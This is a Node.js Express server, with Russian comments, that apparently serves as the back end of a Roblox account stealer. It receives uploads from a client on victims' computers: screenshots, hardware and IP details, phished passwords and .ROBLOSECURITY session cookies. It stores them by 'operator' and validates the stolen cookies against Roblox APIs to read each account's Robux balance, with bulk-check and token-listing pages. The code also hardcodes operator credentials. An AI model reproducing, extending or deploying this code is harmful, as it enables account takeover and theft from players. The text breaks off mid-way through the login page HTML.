const express      = require('express');
const multer      = require('multer');
const cors        = require('cors');
const path        = require('path');
const fs          = require('fs');
const session     = require('express-session');
const MongoStore  = require('connect-mongo').MongoStore;
const https       = require('https');
const http        = require('http');
const WebSocket   = require('ws');
const helmet      = require('helmet');
const rateLimit   = require('express-rate-limit');
const { MongoClient, ObjectId } = require('mongodb');

const app = express();

// ── MongoDB подключение ───────────────────────────────────────────────────────
const MONGO_URI = process.env.MONGODB_URI || '';
const DB_NAME   = process.env.MONGODB_DB || 'file_transfer';
let _db = null;
let _dbConnecting = false;

async function getDb() {
  if (_db) return _db;
  if (!MONGO_URI) throw new Error('MONGODB_URI not set');
  if (_dbConnecting) {
    // Ждём пока подключение идёт
    for (let i = 0; i < 30; i++) {
      await new Promise(r => setTimeout(r, 500));
      if (_db) return _db;
    }
    throw new Error('MongoDB connection timeout');
  }
  _dbConnecting = true;
  try {
    const client = new MongoClient(MONGO_URI, { serverSelectionTimeoutMS: 5000 });
    await client.connect();
    _db = client.db(DB_NAME);
    console.log('✅ MongoDB connected');
    return _db;
  } finally {
    _dbConnecting = false;
  }
}

// Проверка пароля: сначала дефолтный, потом MongoDB
async function checkPassword(username, password) {
  if (!CREDENTIALS[username]) return false;
  if (CREDENTIALS[username] === password) return true;
  try {
    const db = await getDb();
    const s = await db.collection('settings').findOne({ user: username });
    if (s && s.password && s.password === password) {
      CREDENTIALS[username] = s.password;
      return true;
    }
  } catch (e) {}
  return false;
}

// Коллекции: files (скриншоты+метаданные), settings (настройки операторов)

// ── Оператор (владелец жертвы): старые записи без поля operator относятся к Shonll ──
function fileOperator(entry) {
  return (entry && typeof entry.operator === 'string' && entry.operator) || 'Shonll';
}

// ── Security: Helmet (HSTS, XSS Protection, No-Sniff, Frameguard) ─────────────
app.use(helmet({
  contentSecurityPolicy: false,   // отключаем CSP — мешает inline-стилям дашборда
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: 'cross-origin' }
}));

// ── Security: Rate limiter для login (защита от брутфорса) ────────────────────
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 минут
  max: 10,                     // максимум 10 попыток
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Слишком много попыток входа. Попробуйте позже.' }
});

// ── Security: Rate limiter для API (защита от спама/DoS) ──────────────────────
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 минута
  max: 60,                     // 60 запросов в минуту
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => req.path === '/upload' || req.path === '/ws' // не лимитируем загрузки и стрим
});

// ── Middleware ────────────────────────────────────────────────────────────────
app.use('/login228', loginLimiter);
app.use('/api/', apiLimiter);
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(session({
  secret: 'supersecret_ai_key_2025',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ mongoUrl: MONGO_URI }),
  cookie: {
    maxAge: 24 * 60 * 60 * 1000,
    httpOnly: true,            // защита от XSS-кражи cookie
    sameSite: 'strict',        // защита от CSRF
    secure: false              // false т.к. HTTP; при HTTPS поставить true
  }
}));
// ── Отдача файлов (скриншотов) из MongoDB ─────────────────────────────────────
app.get('/uploads/:filename', async (req, res) => {
  try {
    const db = await getDb();
    const doc = await db.collection('files').findOne({ name: req.params.filename });
    if (!doc || !doc.data) return res.status(404).send('Not found');
    const buf = Buffer.from(doc.data, 'base64');
    res.set('Content-Type', doc.contentType || 'image/png');
    res.set('Cache-Control', 'no-cache');
    res.send(buf);
  } catch (e) {
    res.status(404).send('Not found');
  }
});

// ── Статический сайт (docs/) — раздаём с того же сервера ──────────────────────
const DOCS_DIR = path.join(__dirname, '..', 'docs');
app.use(express.static(DOCS_DIR));

// ── SSE Realtime Clients ──────────────────────────────────────────────────────
let sseClients = [];

app.get('/events', requireAuth, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  sseClients.push(res);
  
  req.on('close', () => {
    sseClients = sseClients.filter(c => c !== res);
  });
});

// ── Утилиты декодирования и очистки имён ──────────────────────────────────────
function decodeFilename(name) {
  if (!name) return '';
  const hasWideChars = [...name].some(c => c.charCodeAt(0) > 255);
  if (hasWideChars) return name;
  try {
    return Buffer.from(name, 'latin1').toString('utf8');
  } catch {
    return name;
  }
}

function sanitizeFilename(name) {
  if (!name) return '';
  return name.replace(/[\\/:*?"<>|]/g, '_');
}

// ── Геолокация по IP (ip-api.com, бесплатно, 45 запросов/мин) ─────────────────
const countryCache = new Map();

function getCountryFromIP(ip) {
  return new Promise((resolve) => {
    const raw = (ip || '').toString().trim();
    const pub = raw.replace(/^::ffff:/, '');
    if (!pub || pub === '127.0.0.1' || pub.startsWith('192.168.') || pub.startsWith('10.') || pub.startsWith('172.')) {
      return resolve('Local');
    }
    if (countryCache.has(pub)) return resolve(countryCache.get(pub));

    const req = http.get(`http://ip-api.com/json/${pub}?fields=status,country`, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          const country = json.status === 'success' ? (json.country || 'Unknown') : 'Unknown';
          countryCache.set(pub, country);
          resolve(country);
        } catch (e) {
          resolve('Unknown');
        }
      });
    });
    req.on('error', () => resolve('Unknown'));
    req.setTimeout(4000, () => { req.destroy(); resolve('Unknown'); });
  });
}

// ── Multer (файлы в памяти, потом в MongoDB) ──────────────────────────────────
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ── Учётные данные (используются и сессией, и token-auth для статического сайта) ──
const CREDENTIALS = {
  'Shonll':  'khwSQqtf',
  'DildMan': 'dild228'
};

// ── Настройки операторов (avatar, displayName, themeColor, bio, password) ──────
const DEFAULT_SETTINGS = {
  'Shonll':  { avatar: '🦊', displayName: 'Shonll',  themeColor: '#7c6aff', bio: 'Root Admin' },
  'DildMan': { avatar: '🐉', displayName: 'DildMan', themeColor: '#00CEC9', bio: 'Operator' }
};

async function getOperatorSettings(user) {
  const db = await getDb();
  const doc = await db.collection('settings').findOne({ user });
  return { ...DEFAULT_SETTINGS[user] || {}, ...(doc || {}) };
}

async function setOperatorSettings(user, patch) {
  const db = await getDb();
  const update = {};
  for (const [k, v] of Object.entries(patch)) {
    if (v !== undefined && v !== null) update[k] = v;
  }
  if (Object.keys(update).length === 0) return;
  await db.collection('settings').updateOne(
    { user },
    { $set: update },
    { upsert: true }
  );
  if (patch.password) CREDENTIALS[user] = patch.password;
}

// ── Token-based auth (для статического сайта на GitHub Pages) ──────────────────
// ── Token-based auth (для статического сайта на GitHub Pages) ──────────────────
function makeToken() {
  return require('crypto').randomBytes(32).toString('hex');
}

async function currentUser(req) {
  if (req.session && req.session.user) return req.session.user;
  const db = await getDb();
  
  const h = req.headers.authorization;
  if (h && h.startsWith('Bearer ')) {
    const t = h.slice(7).trim();
    const doc = await db.collection('api_tokens').findOne({ token: t });
    if (doc) return doc.user;
  }
  if (req.query && req.query.token) {
    const doc = await db.collection('api_tokens').findOne({ token: req.query.token });
    if (doc) return doc.user;
  }
  return null;
}

// ── Auth guard (поддерживает cookie-сессию и Bearer/ query-токен) ──────────────
async function requireAuth(req, res, next) {
  try {
    const user = await currentUser(req);
    if (user) { req.authUser = user; return next(); }
    res.status(401).json({ error: 'Unauthorized' });
  } catch (err) {
    res.status(500).json({ error: 'Auth check error' });
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  LOGIN PAGE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.get('/login228', (req, res) => {
  if (req.session.user) return res.redirect('/');
  res.send(loginHTML(req.query.error));
});

app.post('/login228', async (req, res) => {
  const { username, password } = req.body;
  const valid = await checkPassword(username, password);
  if (!valid) return res.redirect('/login228?error=1');
  req.session.user = username;
  res.redirect('/');
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login228'));
});

// ── JSON auth для статического сайта (GitHub Pages) ────────────────────────────
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body || {};
  const valid = await checkPassword(username, password);
  if (!valid) {
    return res.status(401).json({ error: 'Неверный логин или пароль' });
  }
  const token = makeToken();
  const db = await getDb();
  await db.collection('api_tokens').insertOne({ token, user: username, createdAt: new Date() });
  res.json({ token, user: username });
});

app.post('/api/logout', async (req, res) => {
  const h = req.headers.authorization;
  if (h && h.startsWith('Bearer ')) {
    const t = h.slice(7).trim();
    const db = await getDb();
    await db.collection('api_tokens').deleteOne({ token: t });
  }
  res.json({ success: true });
});

app.get('/api/me', requireAuth, async (req, res) => {
  const user = req.authUser || req.session.user;
  try {
    const s = await getOperatorSettings(user);
    res.json({ user, ...s });
  } catch (e) {
    res.json({ user, avatar: '🦊', displayName: user, themeColor: '#7c6aff', bio: '' });
  }
});

// ── Settings API ──────────────────────────────────────────────────────────────
app.get('/api/settings', requireAuth, async (req, res) => {
  const user = req.authUser || req.session.user;
  try {
    const s = await getOperatorSettings(user);
    const { password, ...safe } = s;
    res.json({ user, ...safe });
  } catch (e) {
    res.json({ user, avatar: '🦊', displayName: user, themeColor: '#7c6aff', bio: '' });
  }
});

app.post('/api/settings', requireAuth, async (req, res) => {
  const user = req.authUser || req.session.user;
  const { displayName, avatar, avatarImage, themeColor, bio, newPassword, currentPassword } = req.body || {};

  if (newPassword) {
    const pwdValid = await checkPassword(user, currentPassword);
    if (!currentPassword || !pwdValid) {
      return res.status(403).json({ error: 'Неверный текущий пароль' });
    }
    if (newPassword.length < 4) {
      return res.status(400).json({ error: 'Пароль слишком короткий (мин. 4 символа)' });
    }
  }

  const patch = {};
  if (typeof displayName === 'string' && displayName.trim()) patch.displayName = displayName.trim().substring(0, 32);
  if (typeof avatarImage === 'string' && avatarImage.startsWith('data:image/') && avatarImage.length < 700000) {
    patch.avatarImage = avatarImage;
    patch.avatar = '';
  } else if (typeof avatar === 'string' && avatar.trim()) {
    patch.avatar = avatar.trim().substring(0, 8);
    patch.avatarImage = '';
  }
  if (typeof themeColor === 'string' && /^#[0-9a-fA-F]{6}$/.test(themeColor)) patch.themeColor = themeColor;
  if (typeof bio === 'string') patch.bio = bio.substring(0, 120);
  if (newPassword) patch.password = newPassword;

  try {
    await setOperatorSettings(user, patch);
    const updated = await getOperatorSettings(user);
    res.json({ success: true, settings: updated });
  } catch (e) {
    res.status(500).json({ error: 'Не удалось сохранить (MongoDB недоступна?)' });
  }
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  API — Upload files (from WPF client)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.post('/upload', upload.array('files'), async (req, res) => {
  if (!req.files?.length) return res.status(400).json({ error: 'Нет файлов' });

  const sanitize = (val, max = 256) => {
    if (typeof val !== 'string') return '';
    return val.replace(/[<>\"'{}|\\^]/g, '').substring(0, max);
  };

  let db;
  try {
    db = await getDb();
  } catch (e) {
    return res.status(503).json({ error: 'База данных недоступна' });
  }

  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '—';
  const computerInfo = {
    name:    sanitize(req.body.computerName, 128)  || 'Unknown',
    os:      sanitize(req.body.os, 128)             || '—',
    cpu:     sanitize(req.body.cpu, 256)            || '—',
    ram:     sanitize(req.body.ram, 64)             || '—',
    gpu:     sanitize(req.body.gpu, 256)            || '—',
    ip:      clientIp,
    country: await getCountryFromIP(clientIp)
  };

  const robloxInfo = {
    user: sanitize(req.body.robloxUser, 128) || '',
    pass: sanitize(req.body.fakePassword, 256) || '',
    security: (typeof req.body.robloSecurity === 'string' ? req.body.robloSecurity : '').substring(0, 2048)
  };

  const operator = sanitize(req.body.operator, 64) || 'Shonll';
  const pcName = computerInfo.name;

  // Удаляем предыдущий скриншот этого же компьютера (того же оператора)
  await db.collection('files').deleteMany({
    'computer.name': pcName,
    operator: operator
  });

  const uploaded = [];
  for (const f of req.files) {
    const orig = decodeFilename(f.originalname);
    const fixedName = `screenshot_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}.png`;
    const fileData = f.buffer; // memoryStorage — файл в buffer

    const doc = {
      name: fixedName,
      originalName: orig,
      data: fileData.toString('base64'),
      contentType: f.mimetype || 'image/png',
      size: f.size,
      uploadedAt: new Date().toISOString(),
      computer: computerInfo,
      roblox: robloxInfo,
      operator: operator
    };

    await db.collection('files').updateOne(
      { name: fixedName, operator: operator },
      { $set: doc },
      { upsert: true }
    );

    uploaded.push({ name: fixedName, originalName: orig, size: f.size });
    console.log(`[${new Date().toLocaleTimeString()}] 📥 ${orig} от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
  }

  // Дедупликация токенов
  if (robloxInfo.security) {
    try {
      const newToken = robloxInfo.security.trim();
      await db.collection('files').deleteMany({
        operator: operator,
        name: { $nin: uploaded.map(u => u.name) },
        'roblox.security': newToken
      });

      const rbInfo = await fetchRobuxInfo(robloxInfo.security);
      if (rbInfo.valid && rbInfo.userId) {
        await db.collection('files').deleteMany({
          operator: operator,
          name: { $nin: uploaded.map(u => u.name) },
          'robuxInfo.userId': rbInfo.userId
        });

        for (const u of uploaded) {
          await db.collection('files').updateOne(
            { name: u.name, operator: operator },
            { $set: {
              'robuxInfo.userId': rbInfo.userId,
              'robuxInfo.robux': rbInfo.robux,
              'robuxInfo.valid': true,
              'robuxInfo.checked': new Date().toISOString(),
              'roblox.userId': rbInfo.userId,
              ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
            }}
          );
        }
      }
    } catch (e) {
      console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Дедупликация токена не удалась: ${e.message}`);
    }
  }

  sseClients.forEach(client => {
    try {
      client.write(`data: ${JSON.stringify({ event: 'new_file', files: uploaded })}\n\n`);
    } catch (e) { }
  });

  res.json({ success: true, files: uploaded });
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  API — Update Roblox details for files
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.post('/update-roblox', async (req, res) => {
  const { computerName, robloxUser, fakePassword, robloSecurity } = req.body;
  const operator = (typeof req.body.operator === 'string' && req.body.operator) ? req.body.operator.substring(0, 64) : 'Shonll';
  const db = await getDb();

  // Находим последний файл этого компьютера (оператора)
  const target = await db.collection('files').findOne(
    { 'computer.name': computerName, operator: operator },
    { sort: { uploadedAt: -1 } }
  );

  if (target) {
    const updateSet = {
      'roblox.user': robloxUser,
      'roblox.pass': fakePassword,
      'roblox.security': robloSecurity || ''
    };

    if (robloxUser || robloSecurity) {
      try {
        let newUserId = target.robuxInfo?.userId || target.roblox?.userId;
        if (robloSecurity && !newUserId) {
          const rbInfo = await fetchRobuxInfo(robloSecurity);
          if (rbInfo.valid && rbInfo.userId) {
            newUserId = rbInfo.userId;
            updateSet['robuxInfo.userId'] = rbInfo.userId;
            updateSet['robuxInfo.robux'] = rbInfo.robux;
            updateSet['robuxInfo.valid'] = true;
            updateSet['robuxInfo.checked'] = new Date().toISOString();
            updateSet['roblox.userId'] = rbInfo.userId;
            if (rbInfo.username) updateSet['roblox.user'] = rbInfo.username;
          }
        }

        const newName = (robloxUser || target.roblox?.user || '').toLowerCase().trim();

        // Удаляем дубликаты по имени или userId
        const delQuery = { operator: operator, name: { $ne: target.name }, $or: [] };
        if (newName) delQuery.$or.push({ 'roblox.user': { $regex: new RegExp('^' + newName + '$', 'i') } });
        if (newUserId) delQuery.$or.push({ 'robuxInfo.userId': newUserId });
        if (delQuery.$or.length > 0) {
          await db.collection('files').deleteMany(delQuery);
        }
      } catch (e) {
        console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Дедупликация в update-roblox не удалась: ${e.message}`);
      }
    }

    await db.collection('files').updateOne(
      { _id: target._id },
      { $set: updateSet }
    );

    console.log(`[${new Date().toLocaleTimeString()}] 🔑 Обновлен Roblox аккаунт для "${computerName}": ${robloxUser}${robloSecurity ? ' (+токен)' : ''}`);

    sseClients.forEach(client => {
      try {
        client.write(`data: ${JSON.stringify({ event: 'new_file' })}\n\n`);
      } catch (e) {}
    });
    res.json({ success: true });
  } else {
    res.status(404).json({ error: 'Файл для данного компьютера не найден' });
  }
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  API — Files list (JSON)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.get('/files', requireAuth, async (req, res) => {
  const user = req.authUser || req.session.user;
  try {
    const db = await getDb();
    let files = await db.collection('files')
      .find({ operator: user })
      .sort({ uploadedAt: -1 })
      .toArray();

    files = files.map(f => {
      const { data, ...safe } = f;
      safe.name = f.name;
      return safe;
    });

    const seen = new Map();
    for (const f of files) {
      const pc = f.computer?.name || f.computer?.ip || f.name;
      if (!seen.has(pc) || new Date(f.uploadedAt) > new Date(seen.get(pc).uploadedAt)) {
        seen.set(pc, f);
      }
    }
    res.json([...seen.values()].sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt)));
  } catch (e) {
    console.error('Files error:', e.message);
    res.json([]);
  }
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  DELETE file
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.delete('/files/:name', requireAuth, async (req, res) => {
  const db = await getDb();
  const user = req.authUser || req.session.user;
  const doc = await db.collection('files').findOne({ name: req.params.name, operator: user });
  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
  await db.collection('files').deleteOne({ _id: doc._id });
  res.json({ success: true });
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ROBLOX API — парсинг .ROBLOSECURITY токена
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function robloxRequest(urlPath, robloSecurity) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'apis.roblox.com',
      path: urlPath,
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(data); }
      });
    });
    req.on('error', reject);
    req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
    req.end();
  });
}

function robloxGet(url, robloSecurity) {
  const urlObj = new URL(url);
  return new Promise((resolve, reject) => {
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(data); }
      });
    });
    req.on('error', reject);
    req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
    req.end();
  });
}

async function fetchRobuxInfo(robloSecurity) {
  try {
    const token = robloSecurity.startsWith('_|') ? robloSecurity : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloSecurity}`;
    const authInfo = await robloxGet('https://users.roblox.com/v1/users/authenticated', token);
    if (!authInfo || authInfo.errors) {
      return { valid: false, error: 'Недействительный токен', raw: authInfo };
    }
    const userId = authInfo.id;
    const username = authInfo.name;
    const displayName = authInfo.displayName;

    const balanceData = await robloxGet(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      robloSecurity
    );
    const robux = balanceData?.robux ?? null;

    return {
      valid: true,
      userId,
      username,
      displayName,
      robux,
      created: authInfo.created,
      description: authInfo.description || ''
    };
  } catch (e) {
    return { valid: false, error: e.message };
  }
}

// POST /robux-check — проверка токена и баланса
app.post('/robux-check', requireAuth, async (req, res) => {
  const { robloSecurity } = req.body;
  if (!robloSecurity) {
    return res.status(400).json({ error: 'Токен ROBLOSECURITY не передан' });
  }
  const info = await fetchRobuxInfo(robloSecurity);
  res.json(info);
});

// POST /robux-bulk — массовая проверка всех сохранённых токенов
app.post('/robux-bulk', requireAuth, async (req, res) => {
  const db = await getDb();
  const user = req.authUser || req.session.user;
  const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
  const results = [];
  for (const doc of docs) {
    const roblox = doc.roblox || {};
    try {
      const info = await fetchRobuxInfo(roblox.security);
      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, ...info });
      await db.collection('files').updateOne({ _id: doc._id }, { $set: { 'robuxInfo': { checked: new Date().toISOString(), robux: info.robux, valid: info.valid } } });
    } catch (e) {
      results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message });
    }
  }
  res.json(results);
});

// POST /robux-check-file — проверка токена конкретного файла
app.post('/robux-check-file', requireAuth, async (req, res) => {
  const { filename } = req.body;
  const db = await getDb();
  const user = req.authUser || req.session.user;
  const doc = await db.collection('files').findOne({ name: filename, operator: user });
  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
  const roblox = doc.roblox || {};
  if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
  const rbInfo = await fetchRobuxInfo(roblox.security);
  if (rbInfo.valid) {
    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
      'robuxInfo': { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true },
      ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
    }});
  } else {
    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
      'robuxInfo': { checked: new Date().toISOString(), valid: false, error: rbInfo.error }
    }});
  }
  res.json(rbInfo);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOKENS PAGE — список рабочих токенов с Robux
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.get('/tokens-data', requireAuth, async (req, res) => {
  const user = req.authUser || req.session.user;
  try {
    const db = await getDb();
    const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
    const results = [];
    for (const doc of docs) {
      const roblox = doc.roblox || {};
      try {
        const info = await fetchRobuxInfo(roblox.security);
        results.push({
          file: doc.name, originalName: doc.originalName,
          computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
          user: roblox.user, security: roblox.security, ...info
        });
        const updateSet = { 'robuxInfo.checked': new Date().toISOString(), 'robuxInfo.robux': info.robux, 'robuxInfo.valid': info.valid };
        if (info.valid && info.userId) {
          updateSet['robuxInfo.userId'] = info.userId;
          updateSet['roblox.userId'] = info.userId;
          if (info.username) updateSet['roblox.user'] = info.username;
        }
        await db.collection('files').updateOne({ _id: doc._id }, { $set: updateSet });
      } catch (e) {
        results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
      }
    }
    const byUser = new Map();
    for (const r of results) {
      const id = r.userId || r.security;
      if (!id) continue;
      const existing = byUser.get(id);
      if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) byUser.set(id, r);
    }
    res.json([...byUser.values()].sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0)));
  } catch (e) {
    console.error('Tokens error:', e.message);
    res.json([]);
  }
});

app.get('/tokens', requireAuth, (req, res) => {
  res.send(tokensHTML(req.authUser || req.session.user));
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  AI ANALYSIS (расширенный)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.post('/analyze', requireAuth, async (req, res) => {
  const { filename } = req.body;
  const db = await getDb();
  const user = req.authUser || req.session.user;
  const info = await db.collection('files').findOne({ name: filename, operator: user });
  if (!info) return res.status(400).json({ error: 'Неверное имя файла' });
  const pc = info.computer || {};
  const roblox = info.roblox || {};

  let analysis = `=== AI АНАЛИЗ ФАЙЛА: ${filename} ===\n\n`;
  analysis += `📁 Оригинальное имя: ${info.originalName || filename}\n`;
  analysis += `📅 Загружен: ${info.uploadedAt || 'неизвестно'}\n`;
  analysis += `📦 Размер: ${(info.size / 1024).toFixed(1) || '?'} KB\n`;
  analysis += `💻 Компьютер: ${pc.name || 'Unknown'} | ${pc.os || '?'} | ${pc.ip || '?'}\n`;
  analysis += `🖥 CPU: ${pc.cpu || '?'} | RAM: ${pc.ram || '?'} | GPU: ${pc.gpu || '?'}\n\n`;

  if (roblox.user) {
    analysis += `🎮 ROBLOX АККАУНТ:\n`;
    analysis += `   Никнейм: ${roblox.user}\n`;
    if (roblox.security) {
      analysis += `   Токен: ${roblox.security.substring(0, 20)}...\n`;
      try {
        const rbInfo = await fetchRobuxInfo(roblox.security);
        if (rbInfo.valid) {
          analysis += `   ✅ ТОКЕН ВАЛИДЕН\n`;
          analysis += `   UserId: ${rbInfo.userId}\n`;
          analysis += `   DisplayName: ${rbInfo.displayName}\n`;
          analysis += `   💰 ROBUX: ${rbInfo.robux !== null ? rbInfo.robux.toLocaleString() : 'недоступно'}\n`;
          analysis += `   Аккаунт создан: ${rbInfo.created || '?'}\n`;
          await db.collection('files').updateOne({ _id: info._id }, { $set: {
            'robuxInfo': { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true },
            ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
          }});
        } else {
          analysis += `   ❌ ТОКЕН НЕВАЛИДЕН: ${rbInfo.error || 'неизвестная ошибка'}\n`;
          await db.collection('files').updateOne({ _id: info._id }, { $set: {
            'robuxInfo': { checked: new Date().toISOString(), valid: false, error: rbInfo.error }
          }});
        }
      } catch (e) {
        analysis += `   ⚠️ Ошибка проверки: ${e.message}\n`;
      }
    } else {
      analysis += `   ⚠️ Токен .ROBLOSECURITY отсутствует\n`;
    }
  } else {
    analysis += `⚠️ Привязка к Roblox не обнаружена.\n`;
  }

  res.json({ analysis });
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  LOGIN PAGE HTML
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function loginHTML(error) {
  const errorElement = error ? `<div class="error-msg">⚠️ Неверный логин или пароль!</div>` : '';
  return `<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Система Передачи Файлов — Вход</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: #030307;
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: fixed; inset: 0;
      background: 
        radial-gradient(circle at 20% 20%, rgba(124,106,255,0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 80%, rgba(0,230,118,0.12) 0%, transparent 50%);
      pointer-events: none;
    }
    .login-card {
      background: rgba(18, 18, 28, 0.6);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 24px;
      padding: 3rem 2.5rem;
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      overflow: hidden;
      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    }
    .login-card::before {
      content: '';
      position: absolute; inset: 0;
      background: linear-gradient(135deg, rgba(124,106,255,0.05), rgba(168,85,247,0.03));
      pointer-events: none;
    }
    .logo {
      display: inline-flex; align-items: center; gap: 10px;
      margin-bottom: 2rem;
    }
    .logo-icon {
      width: 40px; height: 40px;
      background: linear-gradient(135deg, #7c6aff, #a855f7);
      border-radius: 10px;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
      box-shadow: 0 8px 24px rgba(124,106,255,0.3);
    }
    .logo-text {
